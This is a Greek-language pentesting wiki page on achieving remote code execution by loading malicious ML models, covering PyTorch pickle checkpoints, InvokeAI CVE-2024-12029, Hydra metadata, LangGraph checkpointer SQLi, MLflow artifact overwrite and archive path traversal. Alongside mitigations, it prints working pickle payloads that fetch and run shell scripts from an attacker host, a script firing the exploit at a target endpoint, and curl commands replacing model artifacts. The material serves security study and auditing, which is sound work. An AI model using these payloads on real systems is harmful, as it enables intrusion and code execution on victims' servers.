# RCE μέσω φόρτωσης μοντέλων

{{#include ../banners/hacktricks-training.md}}

## Φόρτωση μοντέλων για RCE

Τα μοντέλα Machine Learning συνήθως κοινοποιούνται σε διάφορες μορφές, όπως ONNX, TensorFlow, PyTorch κ.λπ. Οι developers μπορούν να τα φορτώσουν στους υπολογιστές τους ή σε συστήματα παραγωγής για να τα χρησιμοποιήσουν. Συνήθως τα μοντέλα δεν θα πρέπει να περιέχουν κακόβουλο κώδικα, αλλά σε ορισμένες περιπτώσεις μπορούν να χρησιμοποιηθούν για την εκτέλεση αυθαίρετου κώδικα στο σύστημα, είτε ως προβλεπόμενη δυνατότητα είτε λόγω ευπάθειας στη βιβλιοθήκη φόρτωσης μοντέλων.

Ο παρακάτω πίνακας παραθέτει ενδεικτικές ευπάθειες αυτής της κατηγορίας:

| **Framework / Tool**        | **Ευπάθεια (CVE, αν υπάρχει)**                                                    | **Διάνυσμα RCE**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Μη ασφαλής αποσειριοποίηση στο* `torch.load` **(CVE-2025-32434)**                                                              | Κακόβουλο pickle στο checkpoint του μοντέλου οδηγεί σε εκτέλεση κώδικα (παρακάμπτοντας την προστασία `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | Το SSRF μαζί με τη λήψη κακόβουλου μοντέλου προκαλεί εκτέλεση κώδικα· RCE μέσω αποσειριοποίησης Java στο management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Μη ασφαλής αποσειριοποίηση checkpoint μέσω `torch.load` **(CVE-2025-23298)**                                           | Μη έμπιστο checkpoint ενεργοποιεί τον pickle reducer κατά την εκτέλεση του `load_model_trainer_states_from_checkpoint` → εκτέλεση κώδικα στο ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + μη ασφαλές hook επέκτασης MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Το ελεγχόμενο από τον χρήστη κλειδί `filter` εισάγει σύνταξη SQL/JSON-path, το `UNION SELECT` κατασκευάζει μια πλαστή εγγραφή checkpoint και, στη συνέχεια, η αποσειριοποίηση `msgpack` εισάγει και καλεί κώδικα Python που επιλέγει ο εισβολέας | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (μη ασφαλές YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Η φόρτωση μοντέλου από YAML χρησιμοποιεί `yaml.unsafe_load` (εκτέλεση κώδικα) <br> Η φόρτωση μοντέλου με layer **Lambda** εκτελεί αυθαίρετο κώδικα Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (ανάλυση TFLite)                                                                                          | Ένα ειδικά διαμορφωμένο μοντέλο `.tflite` προκαλεί υπερχείλιση ακεραίου → αλλοίωση heap (πιθανό RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Η φόρτωση μοντέλου μέσω `joblib.load` εκτελεί pickle με payload `__reduce__` του εισβολέα                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (μη ασφαλές `np.load`) *υπό αμφισβήτηση*                                                                              | Η προεπιλεγμένη ρύθμιση της `numpy.load` επέτρεπε πίνακες αντικειμένων με pickle – κακόβουλο `.npy/.npz` προκαλεί εκτέλεση κώδικα                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Η διαδρομή των εξωτερικών weights του μοντέλου ONNX μπορεί να ξεφύγει από τον κατάλογο (ανάγνωση αυθαίρετων αρχείων) <br> Ένα κακόβουλο tar μοντέλου ONNX μπορεί να αντικαταστήσει αυθαίρετα αρχεία (οδηγώντας σε RCE) | |
| ONNX Runtime (κίνδυνος σχεδιασμού)  | *(Χωρίς CVE)* Custom ops / control flow του ONNX                                                                                    | Ένα μοντέλο με custom operator απαιτεί τη φόρτωση εγγενούς κώδικα του εισβολέα· πολύπλοκα γραφήματα μοντέλων καταχρώνται τη λογική για να εκτελέσουν μη προβλεπόμενους υπολογισμούς   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Η χρήση του model-load API με ενεργοποιημένο το `--model-control` επιτρέπει σχετική διαδρομή path traversal για εγγραφή αρχείων (π.χ. αντικατάσταση του `.bashrc` για RCE)    | |
| **GGML (μορφή GGUF)**      | **CVE-2024-25664 … 25668** (πολλαπλές υπερχειλίσεις heap)                                                                         | Ένα κακοσχηματισμένο αρχείο μοντέλου GGUF προκαλεί υπερχειλίσεις buffer στο heap του parser, επιτρέποντας την εκτέλεση αυθαίρετου κώδικα στο σύστημα του θύματος                     | |
| **Keras (παλαιότερες μορφές)**   | *(Χωρίς νέο CVE)* Παλαιό μοντέλο Keras H5                                                                                         | Κακόβουλο μοντέλο HDF5 (`.h5`) με layer Lambda εξακολουθεί να εκτελεί κώδικα κατά τη φόρτωση (το safe_mode του Keras δεν καλύπτει την παλιά μορφή – «downgrade attack») | |
| **Άλλα** (γενικά)        | *Σχεδιαστικό ελάττωμα* – σειριοποίηση Pickle                                                                                         | Πολλά εργαλεία ML (π.χ. μορφές μοντέλων που βασίζονται σε pickle, Python `pickle.load`) εκτελούν αυθαίρετο κώδικα ενσωματωμένο σε αρχεία μοντέλων, εκτός αν ληφθούν μέτρα μετριασμού | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Μη έμπιστα metadata που περνούν στο `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadata/config του μοντέλου που ελέγχονται από τον εισβολέα ορίζουν το `_target_` σε αυθαίρετο callable (π.χ. `builtins.exec`) → εκτελείται κατά τη φόρτωση, ακόμη και με «ασφαλείς» μορφές (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Επιπλέον, υπάρχουν μοντέλα που βασίζονται σε Python pickle, όπως αυτά που χρησιμοποιούνται από το [PyTorch](https://github.com/pytorch/pytorch/security), τα οποία μπορούν να χρησιμοποιηθούν για την εκτέλεση αυθαίρετου κώδικα στο σύστημα, αν δεν φορτωθούν με `weights_only=True`. Επομένως, κάθε μοντέλο που βασίζεται σε pickle μπορεί να είναι ιδιαίτερα ευάλωτο σε τέτοιου είδους επιθέσεις, ακόμη κι αν δεν αναφέρεται στον παραπάνω πίνακα.

### Metadata Hydra → RCE (λειτουργεί ακόμη και με safetensors)

Η `hydra.utils.instantiate()` εισάγει και καλεί οποιοδήποτε dotted `_target_` σε ένα αντικείμενο configuration/metadata. Όταν βιβλιοθήκες όπως το Hugging Face Transformers περνούν **μη έμπιστα metadata μοντέλου** στο `instantiate()`, ένας εισβολέας μπορεί να δώσει ένα callable και ορίσματα που εκτελούνται αμέσως κατά τη φόρτωση του μοντέλου (δεν απαιτείται pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Παράδειγμα payload (λειτουργεί σε `model_config.yaml` του `.nemo`, `config.json` του repo ή `__metadata__` μέσα σε `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Key points:
- Ενεργοποιείται πριν από την αρχικοποίηση μοντέλου στις `restore_from/from_pretrained` του NeMo, στους HuggingFace coders του uni2TS και στους loaders του FlexTok.
- Η λίστα αποκλεισμού συμβολοσειρών του Hydra μπορεί να παρακαμφθεί μέσω εναλλακτικών διαδρομών εισαγωγής (π.χ. `enum.bltns.eval`) ή ονομάτων που επιλύονται από την εφαρμογή (π.χ. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- Το FlexTok αναλύει επίσης μεταδεδομένα σε μορφή συμβολοσειράς με το `ast.literal_eval`, επιτρέποντας DoS (υπερβολική χρήση CPU/μνήμης) πριν από την κλήση Hydra.

### 🆕  InvokeAI RCE μέσω `torch.load` (CVE-2024-12029)

Το `InvokeAI` είναι ένα δημοφιλές open-source web interface για το Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install`, το οποίο επιτρέπει στους χρήστες να κατεβάζουν και να φορτώνουν μοντέλα από αυθαίρετες διευθύνσεις URL.<sup>[[1]](#references)</sup>

Εσωτερικά, το endpoint τελικά καλεί:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Όταν το παρεχόμενο αρχείο είναι ένα **PyTorch checkpoint (`*.ckpt`)**, το `torch.load` εκτελεί **pickle deserialization**. Επειδή το περιεχόμενο προέρχεται απευθείας από URL που ελέγχει ο χρήστης, ένας επιτιθέμενος μπορεί να ενσωματώσει στο checkpoint ένα κακόβουλο αντικείμενο με προσαρμοσμένη μέθοδο `__reduce__`. Η μέθοδος εκτελείται **κατά τη deserialization**, οδηγώντας σε **remote code execution (RCE)** στον διακομιστή InvokeAI.

Στην ευπάθεια αποδόθηκε το **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Βήμα προς βήμα εκμετάλλευση

1. Δημιουργήστε ένα κακόβουλο checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Φιλοξενήστε το `payload.ckpt` σε έναν HTTP server που ελέγχετε (π.χ. `http://ATTACKER/payload.ckpt`).
3. Ενεργοποιήστε το ευάλωτο endpoint (δεν απαιτείται έλεγχος ταυτότητας):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Όταν το InvokeAI κατεβάζει το αρχείο, καλεί την `torch.load()` → εκτελείται το gadget `os.system` και ο attacker αποκτά εκτέλεση κώδικα στο context της διεργασίας του InvokeAI.

Έτοιμο exploit: το module **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` αυτοματοποιεί όλη τη διαδικασία.<sup>[[3]](#references)</sup>

#### Προϋποθέσεις

•  InvokeAI 5.3.1-5.4.2 (η προεπιλεγμένη τιμή της σημαίας scan είναι **false**)
•  Το `/api/v2/models/install` είναι προσβάσιμο από τον attacker
•  Η διεργασία έχει δικαιώματα εκτέλεσης shell commands

#### Μετριασμοί

* Αναβαθμίστε σε **InvokeAI ≥ 5.4.3** – η ενημέρωση κώδικα ορίζει ως προεπιλογή το `scan=True` και πραγματοποιεί σάρωση για malware πριν από το deserialization.<sup>[[2]](#references)</sup>
* Κατά τη φόρτωση checkpoints μέσω κώδικα, χρησιμοποιήστε `torch.load(file, weights_only=True)` ή το νέο helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Επιβάλετε allow-lists / signatures για τις πηγές μοντέλων και εκτελέστε την υπηρεσία με τα ελάχιστα απαιτούμενα δικαιώματα.

> ⚠️ Να θυμάστε ότι **κάθε** format βασισμένο σε Python pickle (συμπεριλαμβανομένων πολλών αρχείων `.pt`, `.pkl`, `.ckpt`, `.pth`) είναι εγγενώς μη ασφαλές για deserialization από μη έμπιστες πηγές.

---

Παράδειγμα ad-hoc μετριασμού, αν πρέπει να συνεχίσετε να εκτελείτε παλαιότερες εκδόσεις του InvokeAI πίσω από reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE μέσω μη ασφαλούς `torch.load` (CVE-2025-23298)

Το Transformers4Rec της NVIDIA (μέρος του Merlin) εξέθετε έναν μη ασφαλή loader checkpoint, ο οποίος καλούσε απευθείας τη `torch.load()` σε διαδρομές που παρείχε ο χρήστης. Επειδή η `torch.load` βασίζεται στην Python `pickle`, ένα checkpoint που ελέγχεται από εισβολέα μπορεί να εκτελέσει αυθαίρετο κώδικα μέσω ενός reducer κατά την αποσειριοποίηση.<sup>[[5]](#references)</sup>

Ευάλωτη διαδρομή (πριν από τη διόρθωση): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Γιατί αυτό οδηγεί σε RCE: Στην Python `pickle`, ένα αντικείμενο μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει ένα callable και ορίσματα. Το callable εκτελείται κατά το unpickling. Αν υπάρχει τέτοιο αντικείμενο σε ένα checkpoint, εκτελείται πριν χρησιμοποιηθούν οποιαδήποτε βάρη.

Ελάχιστο παράδειγμα κακόβουλου checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Φορείς παράδοσης και ακτίνα επίδρασης:
- Trojanized checkpoints/models που διαμοιράζονται μέσω repos, buckets ή artifact registries
- Αυτοματοποιημένα pipelines resume/deploy που φορτώνουν αυτόματα checkpoints
- Η εκτέλεση γίνεται μέσα σε workers εκπαίδευσης/inference, συχνά με αυξημένα δικαιώματα (π.χ. root σε containers)

Διόρθωση: Το commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) αντικατέστησε την άμεση κλήση `torch.load()` με έναν περιορισμένο deserializer, που επιτρέπει μόνο στοιχεία από allow-list και υλοποιείται στο `transformers4rec/utils/serialization.py`. Ο νέος loader επικυρώνει τους τύπους και τα πεδία και αποτρέπει την κλήση αυθαίρετων callables κατά τη φόρτωση.<sup>[[7]](#references)</sup>

Οδηγίες άμυνας ειδικά για PyTorch checkpoints:
- Μην κάνετε unpickle μη έμπιστων δεδομένων. Προτιμήστε μη εκτελέσιμες μορφές όπως [Safetensors](https://huggingface.co/docs/safetensors/index) ή ONNX, όταν είναι δυνατό.
- Αν πρέπει να χρησιμοποιήσετε serialization του PyTorch, βεβαιωθείτε ότι έχει οριστεί `weights_only=True` (υποστηρίζεται σε νεότερες εκδόσεις του PyTorch) ή χρησιμοποιήστε έναν custom unpickler με allow-list, παρόμοιο με το patch του Transformers4Rec.<sup>[[4]](#references)</sup>
- Επιβάλετε έλεγχο προέλευσης/υπογραφών των μοντέλων και εκτελέστε το deserialization σε sandbox (seccomp/AppArmor, μη-root χρήστης, περιορισμένο FS και χωρίς εξερχόμενη κίνηση δικτύου).
- Παρακολουθείτε για απρόσμενες child processes από υπηρεσίες ML κατά τη φόρτωση checkpoint· εντοπίζετε τη χρήση των `torch.load()`/`pickle`.

Αναφορές σε POC και ευάλωτες εκδόσεις/patch:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Ευάλωτος loader πριν από το patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC κακόβουλου checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader μετά το patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Παράδειγμα – δημιουργία ενός κακόβουλου μοντέλου PyTorch

- Δημιουργήστε το μοντέλο:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Φορτώστε το μοντέλο:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Το FaceDetection-DSFD της Tencent διαθέτει ένα endpoint `resnet` που αποσειριοποιεί δεδομένα ελεγχόμενα από τον χρήστη. Η ZDI επιβεβαίωσε ότι ένας απομακρυσμένος εισβολέας μπορεί να εξαναγκάσει ένα θύμα να φορτώσει μια κακόβουλη σελίδα/αρχείο, να το κάνει να στείλει ένα ειδικά διαμορφωμένο σειριοποιημένο blob σε αυτό το endpoint και να προκαλέσει αποσειριοποίηση ως `root`, οδηγώντας σε πλήρη παραβίαση.

Η ροή του exploit αντικατοπτρίζει τη συνηθισμένη κατάχρηση του pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Οποιοδήποτε gadget είναι προσβάσιμο κατά την αποσειριοποίηση (constructors, `__setstate__`, callbacks του framework κ.λπ.) μπορεί να χρησιμοποιηθεί με τον ίδιο τρόπο ως όπλο, ανεξάρτητα από το αν το transport ήταν HTTP, WebSocket ή ένα αρχείο που αποτέθηκε σε έναν κατάλογο υπό παρακολούθηση.



### LangGraph checkpointer SQLi → MessagePack RCE

Αυτή η αλυσίδα επίθεσης είναι ενδιαφέρουσα, επειδή ο attacker **δεν χρειάζεται να ανεβάσει ένα κακόβουλο αρχείο μοντέλου**. Αντίθετα, η εφαρμογή εκθέτει ένα **API persistence για AI agent** (`get_state_history(..., filter=...)`) και η είσοδος του χρήστη καταλήγει στο query builder του checkpointer.

#### 1. Structural SQLi στα metadata filters

Ένα ευάλωτο μοτίβο SQLite έμοιαζε ως εξής:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Η τιμή δεσμεύεται αργότερα, αλλά το `query_key` συνενώνεται στη **συμβολοσειρά JSON path**, οπότε ένα `'` μέσα στο κλειδί του dictionary ξεφεύγει από το `'$.{query_key}'` και εισάγει SQL. Το ίδιο ισχύει για **JSON paths, identifiers, operators, `LIMIT` και πεδία TTL**: τα placeholders προστατεύουν μόνο τις τιμές, όχι τη δομική σύνταξη του query.

#### 2. Το `UNION SELECT` μπορεί να στοχεύσει downstream sinks, όχι μόνο στην κλοπή δεδομένων

Το query επιστρέφει τα `type` και τα σειριοποιημένα bytes του `checkpoint`, τα οποία στη συνέχεια χρησιμοποιούνται ως:

```python
self.serde.loads_typed((type, checkpoint))
```

Αυτό σημαίνει ότι ένα SQLi στη ρήτρα `WHERE` μπορεί να εισαγάγει μια **πλαστή γραμμή αποτελεσμάτων**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Αν μεταγενέστερος κώδικας κάνει parse, deserialize, γράφει ή εκτελεί οποιαδήποτε επιλεγμένη στήλη, αντιστοιχίστε αυτές τις στήλες στα sinks τους. Σε αυτή την περίπτωση, η πλαστή γραμμή μετατρέπει το SQLi σε **deserialization ελεγχόμενο από τον attacker**.

#### 3. Τα μη ασφαλή hooks επεκτάσεων του MessagePack ισοδυναμούν με code gadgets

Η διαδρομή `msgpack` του LangGraph χρησιμοποιούσε ένα custom extension hook που έκανε unpack ένα εμφωλευμένο tuple και εκτελούσε:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Έτσι, ένα αντικείμενο επέκτασης MessagePack που κωδικοποιεί κάτι ισοδύναμο με το `("os", "system", "id > /tmp/pwned")` εισάγει το `os`, επιλύει το `system` και εκτελεί την εντολή. Κατά τον έλεγχο AI frameworks, εξετάστε **custom MessagePack/JSON/pickle revivers** για dynamic imports, reflection ή αυθαίρετη dispatch κλήσεων.

#### 4. Πρακτικό μοτίβο ελέγχου για agent frameworks

Ελέγξτε κάθε είσοδο που ελέγχεται από τον χρήστη και φτάνει σε:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders που δημιουργούν SQL ή Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths που εμπιστεύονται εγγραφές οι οποίες επιστρέφονται από το persistence layer

Αυτή η συγκεκριμένη αλυσίδα επηρέασε self-hosted LangGraph deployments που χρησιμοποιούν **SQLite** ή **Redis** checkpointers, όταν μη έμπιστοι χρήστες μπορούσαν να ελέγχουν το `filter`. Οι εκδόσεις με διορθώσεις που αναφέρονταν στη γνωστοποίηση ήταν `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` και `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Αντικατάσταση artifact MLflow PyFunc για pickle RCE

Ένα MLflow PyFunc που δημιουργείται από ένα `PythonModel` μπορεί να αποθηκεύσει το serialized object ως `python_model.pkl`. Τα model metadata ορίζουν το `mlflow.pyfunc.model` ως loader του, ενώ η υλοποίηση του MLflow χρησιμοποιεί αυτό το όνομα αρχείου για το αποθηκευμένο Python model. Κατά συνέπεια, η δυνατότητα εγγραφής στο artifact store μπορεί να οδηγήσει σε εκτέλεση κώδικα σε διαφορετική εφαρμογή που αργότερα φορτώνει το model.<sup>[[17]](#references)[[18]](#references)</sup>

Η χρήσιμη αλυσίδα είναι **δικαίωμα εγγραφής artifact → αντικατάσταση του pickle → πρόκληση επαναφόρτωσής του από consumer inference**. Για ένα experiment που χρησιμοποιεί proxied ρίζα `mlflow-artifacts:/...`, απαριθμήστε το experiment, το run και τη διαδρομή artifact του model. Ο tracking server εκθέτει `GET` και `PUT` στο `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Ένας minimal reducer μπορεί να εκτελέσει μια εντολή μόλις ο consumer κάνει unpickle το artifact. Η δημιουργία του payload με την έκδοση Python που δηλώνεται στο `MLmodel` αποφεύγει προβλήματα συμβατότητας.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Ενεργοποιήστε τη λειτουργία που **φορτώνει το υπάρχον μοντέλο**, όπως την πρόβλεψη, τη βαθμολόγηση ή την ανάπτυξη. Μην κάνετε πρώτα retrain, επειδή η εκπαίδευση μπορεί να αντικαταστήσει το κακόβουλο artifact με ένα νέο μοντέλο. Ένα σφάλμα της εφαρμογής δεν αποκλείει την εκμετάλλευση: το reducer επιστρέφει την ακέραια τιμή κατάστασης εξόδου της εντολής αντί για ένα αξιοποιήσιμο μοντέλο. Ξεκινήστε με μια παρατηρήσιμη παρενέργεια, όπως ένα ICMP ή HTTP callback, και έπειτα αντικαταστήστε την με το τελικό payload.<sup>[[20]](#references)</sup>

Κατά την αξιολόγηση, διακρίνετε την άδεια δημιουργίας ενός run από την άδεια αντικατάστασης artifacts που ανήκουν σε άλλο run. Ελέγξτε τον έλεγχο ταυτότητας και τα δικαιώματα ενημέρωσης ανά run, επιθεωρήστε τυχόν απροσδόκητες τροποποιήσεις του `python_model.pkl` και αντιμετωπίστε την προέλευση και την ακεραιότητα του μοντέλου ως μέρος του ορίου εκτέλεσης. Ο τρέχων κώδικας του MLflow υποστηρίζει επίσης τη ρύθμιση `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` και προτείνει artifacts models-from-code αντί της φόρτωσης δεδομένων cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Εκτεθειμένοι servers μοντέλων και υποδομή ML

Η φόρτωση ενός κακόβουλου μοντέλου δεν είναι ο μόνος τρόπος εκτέλεσης κώδικα σε υποδομή ML. Τα API υποβολής εργασιών, τα endpoints επικύρωσης κώδικα και η ανάκτηση μοντέλων από registry σε self-hosted υπηρεσίες AI μπορούν να οδηγήσουν σε εκτέλεση κώδικα χωρίς κανένα αρχείο μοντέλου. Δείτε [Εκτεθειμένες self-hosted υπηρεσίες AI](AI-Exposed-Self-Hosted-AI-Services.md).

## Μοντέλα σε Path Traversal

Όπως αναφέρεται σε [**αυτήν την ανάρτηση ιστολογίου**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), οι περισσότερες μορφές μοντέλων που χρησιμοποιούνται από διαφορετικά AI frameworks βασίζονται σε αρχεία αρχειοθέτησης, συνήθως `.zip`. Επομένως, ενδέχεται να είναι δυνατή η κατάχρηση αυτών των μορφών για επιθέσεις path traversal, επιτρέποντας την ανάγνωση αυθαίρετων αρχείων από το σύστημα όπου φορτώνεται το μοντέλο.<sup>[[16]](#references)</sup>

Για παράδειγμα, με τον παρακάτω κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργήσει ένα αρχείο στον κατάλογο `/tmp` όταν φορτωθεί:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ή, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργήσει ένα symlink προς τον κατάλογο `/tmp` όταν φορτωθεί:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Εμβάθυνση: αποσειριοποίηση Keras .keras και αναζήτηση gadgets

Για έναν στοχευμένο οδηγό σχετικά με τα εσωτερικά του .keras, το RCE μέσω Lambda-layer, το arbitrary import issue σε εκδόσεις ≤ 3.8 και την ανακάλυψη gadgets μετά το fix μέσα στο allowlist, δείτε:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Ιστολόγιο OffSec – "CVE-2024-12029 – Αποσειριοποίηση μη έμπιστων δεδομένων στο InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit επιδιόρθωσης του InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Τεκμηρίωση module Metasploit του Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – ζητήματα ασφάλειας για το torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Ιστολόγιο ZDI – CVE-2025-23298: Απόκτηση Remote Code Execution στο NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Συμβουλευτικό δελτίο ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit επιδιόρθωσης του Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Ευάλωτος loader πριν από την επιδιόρθωση (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC κακόβουλου checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader μετά την επιδιόρθωση (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution με σύγχρονες μορφές και βιβλιοθήκες AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Τεκμηρίωση Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit block-list του Hydra (προειδοποίηση για RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Από SQLi σε RCE: Exploiting του checkpointer του LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Pivoting σε Archive Slip bugs για bounty υψηλής αξίας σε AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Συμβουλευτικό δελτίο Snyk και proof of concept PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
